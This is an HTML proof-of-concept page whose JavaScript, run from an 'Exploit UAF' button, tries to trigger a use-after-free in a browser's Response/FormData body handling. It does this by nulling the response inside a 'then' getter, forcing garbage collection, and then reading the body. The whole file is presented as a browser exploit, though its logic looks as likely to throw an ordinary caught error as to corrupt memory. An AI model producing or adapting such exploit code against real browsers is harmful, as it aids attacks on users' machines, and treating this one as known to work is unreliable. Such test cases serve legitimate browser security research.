<!DOCTYPE html>
<html>
<head>
    <script>
        function exploitUAF() {
            let blob = new Blob([], { type: 'application/octet-stream' });
            let formData = new FormData();
            formData.append('emptyBlob', blob);

            let response = new Response(formData);
            Object.defineProperty(response, 'then', {
                get: function() {
                    response = null;
                    if (typeof gc === "function") gc();
                    return undefined;
                }
            });

            response.arrayBuffer().then(() => {
                try {
                    let consumer = response.body.getReader();
                    consumer.read().then(() => {
                        console.log("Attempting access after GC");
                    }).catch(e => {
                        console.error(e.message);
                        alert(e.message);
                    });
                } catch (e) {
                    console.error(e.message);
                    alert(e.message);
                }
            });
        }
    </script>
</head>
<body>
    <button onclick="exploitUAF()">Exploit UAF</button>
</body>
</html>